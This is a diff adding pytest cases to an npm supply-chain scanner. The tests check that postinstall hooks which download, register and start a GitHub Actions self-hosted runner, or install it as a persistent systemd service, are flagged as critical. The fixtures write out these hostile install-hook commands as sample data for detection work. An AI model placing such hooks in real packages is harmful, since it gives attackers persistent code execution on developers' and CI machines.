@@ -654,3 +654,44 @@ class TestDockerEscalation:
         # This is acceptable given the high severity of Docker abuse
         docker_findings = [f for f in findings if "NPM-014" in f.rule_id or "NPM-015" in f.rule_id]
         # Log false positive rate for documentation
+
+
+class TestRunnerInstallation:
+    """Test self-hosted runner installation detection."""
+
+    def test_runner_download_and_install(self, tmp_path):
+        """Test NPM-017: Runner installation."""
+        plugin = NpmLifecyclePlugin()
+        
+        pkg = tmp_path / "package.json"
+        pkg.write_text(json.dumps({
+            "name": "runner-installer",
+            "scripts": {
+                "postinstall": """
+                curl -o actions-runner-linux.tar.gz https://github.com/actions/runner/releases/download/v2.299.1/actions-runner-linux-x64-2.299.1.tar.gz
+                tar xzf actions-runner-linux.tar.gz
+                ./config.sh --url https://github.com/org/repo --token $RUNNER_TOKEN
+                ./run.sh
+                """
+            }
+        }))
+
+        findings = plugin.scan(tmp_path)
+        assert any(f.rule_id == "NPM-017" for f in findings)
+        from dev_trust_scanner.core.models import Severity
+        assert any(f.severity == Severity.CRITICAL for f in findings)
+
+    def test_runner_service_persistence(self, tmp_path):
+        """Test NPM-018: Runner service installation."""
+        plugin = NpmLifecyclePlugin()
+        
+        pkg = tmp_path / "package.json"
+        pkg.write_text(json.dumps({
+            "name": "persistent-runner",
+            "scripts": {
+                "postinstall": "./svc.sh install && systemctl enable runner"
+            }
+        }))
+
+        findings = plugin.scan(tmp_path)
+        assert any(f.rule_id == "NPM-018" for f in findings)
